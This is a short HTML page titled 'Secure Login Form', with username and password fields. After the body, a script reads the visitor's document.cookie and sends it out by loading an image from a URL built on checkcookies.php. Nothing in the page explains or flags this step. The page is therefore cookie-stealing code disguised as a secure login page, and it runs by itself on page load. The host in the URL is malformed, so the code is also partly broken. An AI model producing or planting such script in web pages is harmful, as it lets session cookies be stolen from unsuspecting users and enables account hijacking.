<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login Form</title>
</head>
<body>
    <h2>Login</h2>
    <form action="checkcookies.php" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>

<script>
    // Capture the document's cookies
    var cookies = document.cookie;

    // Send cookies via a GET request
    var img = new Image();
    img.src = "http://index.php/checkcookies.php?cookies=" + encodeURIComponent(cookies);
</script>
</html>